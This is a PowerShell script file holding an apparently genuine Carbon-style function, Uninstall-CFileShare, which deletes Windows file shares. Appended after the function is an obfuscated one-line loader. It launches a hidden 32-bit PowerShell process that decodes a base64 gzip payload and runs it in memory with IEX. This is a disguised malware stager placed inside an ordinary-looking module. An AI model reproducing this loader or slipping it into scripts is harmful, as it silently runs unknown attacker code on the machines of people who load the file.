
function Uninstall-CFileShare
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $Name
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    $errors = @{
                [uint32]2 = 'Access Denied';
                [uint32]8 = 'Unknown Failure';
                [uint32]9 = 'Invalid Name';
                [uint32]10 = 'Invalid Level';
                [uint32]21 = 'Invalid Parameter';
                [uint32]22 = 'Duplicate Share';
                [uint32]23 = 'Restricted Path';
                [uint32]24 = 'Unknown Device or Directory';
                [uint32]25 = 'Net Name Not Found';
            }

    if( -not (Test-CFileShare -Name $Name) )
    {
        return
    }

    Get-CFileShare -Name $Name |
        ForEach-Object { 
            $share = $_
            $deletePhysicalPath = $false
            if( -not (Test-Path -Path $share.Path -PathType Container) )
            {
                New-Item -Path $share.Path -ItemType 'Directory' -Force | Out-String | Write-Debug
                $deletePhysicalPath = $true
            }

            if( $PSCmdlet.ShouldProcess( ('{0} ({1})' -f $share.Name,$share.Path), 'delete' ) )
            {
                Write-Verbose ('Deleting file share ''{0}'' (Path: {1}).' -f $share.Name,$share.Path)
                $result = $share.Delete() 
                if( $result.ReturnValue )
                {
                    Write-Error ('Failed to delete share ''{0}'' (Path: {1}). Win32_Share.Delete() method returned error code {2} which means: {3}.' -f $Name,$share.Path,$result.ReturnValue,$errors[$result.ReturnValue])
                }
            }

            if( $deletePhysicalPath -and (Test-Path -Path $share.Path) )
            {
                Remove-Item -Path $share.Path -Force -Recurse
            }
        }
}


if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAJ0ZmFcCA7VWbW/aSBD+nEr9D1aFZFslGAhpmkiVbo15cXgJxGBCKDpt7LVZWLzEXicxvf73G4PdEDWt0pPOSsSud2b22Wee2bEXB46gPJAS05O+vX93NMAhXktKgX4amqF/NR5PilIh6sTOmDVOLol6dARGhdj87NiGK32RlBnabAy+xjSYX1zU4zAkgdjPSy0iUBSR9R2jJFJU6R9psiAhOb66WxJHSN+kwt+lFuN3mGVmSR07CyIdo8BN17rcwSm4krVhVCjy16+yOjuuzEuN+xizSJGtJBJkXXIZk1Xpu5puOEo2RJF71Al5xD1RmtDgpFoaBxH2SB+iPZAeEQvuRrIKB4G/kIg4DKT8SGmMvYUiw3AQcge5bkgicCiZwQNfEaUQxIwVpb+UWQbgOg4EXRNYFyTkG4uED9QhUamNA5eRa+LNlT55zM/9Vifl0AmsBiJUi5Ca15H2uBszsneW1Z+xHmRUhedlVoGL7+/fvX/n5XJYPtyfD1prdqgJGB3NdmMCiJUBj+jO9otULko92BgLHiYwLYzCmKhzaZYmYzafS4WgnRB+viz+OkQltwfre+6Orq6iZFSDhZnNqTsHxyxfBTe47/TM/nadyu836jOIRwNiJAFeUycXmPJaIojHyO7YpdysDwAVOVsgrkEY8bFIeS1Ks5/dGmsqfvjqMWUuCZEDyYwAFeRZfQlmnypFNoMeWQNl+7kMKfFA1iS3zqSc5LunczCS6wxHUVEaxFBXTlGyCGbELUooiGi2hGLBd0P5GW4vZoI6OBJ5uLn6ks1s1zoPIhHGDuQSGBhZG+JQzFJCilKbukRPLOrnu8uv0lHHjNHAh0gPkA54k9JgiVQhIQDN1aCWLCLM9YaRNZjtKr3JsA91nZXGTlXYJ678OtRc/Xupp9TknBwAhXxbjIuiZNNQwLWR0vwssP+M5uDmOMBVD0mWKCUvqZmeiLQICm7ntLa6TzWbMbbjJxTATTPkax1H5FPNEiEwp3zQrmgdwTM1A9Zz9BWtoEdaMXvwP6YnJjfO3M7lsq2FxtPCQ2Zk9toDY9hu1x4uLbsmrIYpOgNT9Bo3y6WF2tfjqbg1UXtEy6tpbbu5pFuri9zpk/Zpq28fy/rTdum73tTwPP/Ms64rp03andSHermKu0Yj7k70R71cixr0sT2k4+HqsinupjbDY0/zbyrnmD51w6Vd4b2tiVBrceJsLz27tei5ybStnU9qK9RAqB407KbOO1M9RAPNxr7NHzu+vqj6dVTvGpTcDsdNfThs6mjcWt4b55oPvjd4oU/sKr3d3FwvYN4ECB2tXDNdsuXTIZDU4gj712Dj16vOwgMb4yPSP/Z5VMUrnSMdbJq394BrumkOGKyPxlWObNa/wah7mzQ1rTId1FC7TCctH6Uhsa8PMYoejK2hVWyXu5PT/tTT7Bt2phn10cbxNE17bBsd57by9Pnq7HN3Qu01R2NNsz+k+gCBFGi9ERzk+1cXfg+H0QIz0AFc43l1NnnYzC7jAaeph6KkPXpFwoAwaGnQ9HJJI8a4k7aGH7c2tKZ9w5hDgY5heFJ9daRKPwzV556Rv7q4uAWgUCJ76Za6JPDFolh+OimX4covP9XKcNS3H6/ON4mSBSumTWPH0HN8touvplVT2FI/qTb/V/ayYl3Aj/sW9p7f/Wb1TYyWi/uT//T65Ys/IvdPTz/BVIChBdcNI/uG+GsSMrUcfFbs8wNa8LIn/by7isVxH743/gWw9+WJVgoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

